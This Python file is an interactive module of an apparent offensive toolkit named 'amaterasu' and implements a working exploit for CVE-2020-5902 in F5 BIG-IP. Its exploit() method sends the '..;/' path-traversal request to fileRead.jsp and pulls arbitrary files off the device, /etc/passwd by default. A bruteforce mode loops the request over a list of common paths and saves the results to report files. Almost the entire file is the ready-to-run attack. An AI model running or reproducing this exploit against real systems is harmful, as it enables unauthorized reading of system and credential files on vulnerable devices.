#!/usr/bin/env python3.7
#coding: utf-8
#Project amaterasu

import argparse
import cmd2
import os.path
import requests
from huepy import *
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

set_parser = argparse.ArgumentParser()
set_subparsers = set_parser.add_subparsers(title='subcommands', help='subcommand help')

parser_target = set_subparsers.add_parser('target', help='target help')
parser_target.add_argument('target', type=str)

parser_useBruteforce = set_subparsers.add_parser('bruteforce', help='bruteforce help')
parser_useBruteforce.add_argument('bruteforce', type=bool)

parser_filename = set_subparsers.add_parser('filename', help='set file name to retrieve from device. Default: /etc/passwd')
parser_filename.add_argument('filename', type=str)

show_parser = argparse.ArgumentParser()
show_parser.add_argument('show', choices=["config"])

class cve_2020_5902(cmd2.Cmd):
	prompt = 'amaterasu[exploitation/cve_2020_5902]> '

	def __init__(self):
		super().__init__()
		self.filenames = []
		self.filename = '/etc/passwd'
		self.target = ''
		self.bruteforce = False

	def show(self, args):
		'''Shows something'''
		if args.show == 'config':
			print(f'Target: {self.target}\nUse bruteforce: {self.bruteforce}\nFilename: {self.filename}')

	def set_target(self, args):
		self.target = args.target
		print(info(f'Target set: {self.target}'))

	def set_useBruteforce(self, args):
		self.bruteforce = args.bruteforce
		print(info(f'Use bruteforce set: {self.bruteforce}'))

	def set_filename(self, args):
		self.filename = args.filename
		print(info(f'Filename set: {self.filename}'))

	parser_target.set_defaults(func = set_target)
	parser_useBruteforce.set_defaults(func = set_useBruteforce)
	parser_filename.set_defaults(func = set_filename)
	show_parser.set_defaults(func = show)

	@cmd2.with_argparser(set_parser)
	def do_set(self, args):
		'''Used to set options.'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('set')

	@cmd2.with_argparser(show_parser)
	def do_show(self, args):
		''' Show [config, target etc.].'''
		func = getattr(args, 'func', None)

		if func is not None:
			func(self, args)
		else:
			self.do_help('show')

	def do_back(self, args):
		'''Goes back to Amaterasu.'''
		return True

	def exploit(self, target, filename):
		request_target = requests.get(f'https://{target}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={filename}', verify=False)

		try:
			data = request_target.json()
			current_file = os.path.dirname(os.path.abspath(__file__))

			if os.path.exists(os.path.dirname(f'{current_file}\\reports')):
				with open(f'{current_file}\\reports\\{self.target}_cve_2020_5902.txt', 'w+', encoding='utf-8') as file:
					file.write(data['output'])
					file.close()
		except Exception as e:
			print(bad(f'Error: {e}'))
			return None

		return data['output']

	def do_run(self, args):
		''' Runs the module.'''
		if self.bruteforce and self.target != None:
			with open('common_paths.txt', 'r') as filename:
				for line in filename.readlines():
					self.filenames.append(line.strip())

			for filename in self.filenames:
				try:
					output = self.exploit(self.target, filename)

					if output:
						print(good(f'{self.target}\tExploit successful.'))
						print(good(f'Saved {self.filename} file in reports/'))
					else:
						print(bad(f'{self.target}\tCould not exploit it.'))
				except Exception as e:
					print(f'Error: {e}')

		if self.target != None:
			try:
				output = self.exploit(self.target, self.filename)

				if output:
					print(good(f'{self.target}\tExploit successful.'))
					print(good(f'Saved {self.filename} file in reports/'))
				else:
					print(bad(f'{self.target}\tCould not exploit it.'))

			except Exception as e:
				print(f'Error: {e}')
